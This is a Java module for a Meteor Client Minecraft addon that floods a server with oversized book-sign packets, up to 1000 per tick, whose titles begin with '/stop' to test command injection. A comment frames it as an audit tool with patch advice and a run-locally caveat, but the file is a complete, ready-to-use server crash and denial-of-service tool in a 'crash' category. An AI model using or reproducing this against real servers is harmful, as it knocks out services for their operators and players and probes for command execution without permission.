package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;

import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;

/**
 * AUDIT: Book Crash (oversized payload + title command injection)
 *
 * Spams BookUpdateC2SPacket with 50 pages of 255 chars each and a title
 * beginning with "/stop". Tests two independent surfaces:
 *
 *   1. Payload size: a server that accepts 50 × 255-char pages per packet per
 *      tick is trivially budgetable by the sender. The payload must be capped
 *      at decode time, before the signing or signing-validation paths run.
 *
 *   2. Title command injection: if the book-sign handler passes the title
 *      string to a command dispatcher, a title of "/stop…" could execute
 *      arbitrary server commands with the signing player's permissions.
 *
 * Patch signal: enforce max page count and max page/title byte length at
 * packet decode; treat title as opaque UTF-8 text, never as a command string;
 * rate-limit book-sign submissions per player.
 *
 * Run against your OWN local server only.
 */
public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(100).min(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public BookCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "book-crash",
            "Spams oversized book sign packets to stress server book processing.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        for (int i = 0; i < amount.get(); i++) sendBadBook();
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String page  = randomAlphanumeric(255);
        ArrayList<String> pages = new ArrayList<>();
        for (int i = 0; i < 50; i++) pages.add(page);
        mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
            mc.player.getInventory().getSelectedSlot(), pages, Optional.of(title)));
            packetsSent++;
    }

    private static final Random RAND = new Random();
    private static final String CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    private static String randomAlphanumeric(int len) {
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) sb.append(CHARS.charAt(RAND.nextInt(CHARS.length())));
        return sb.toString();
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
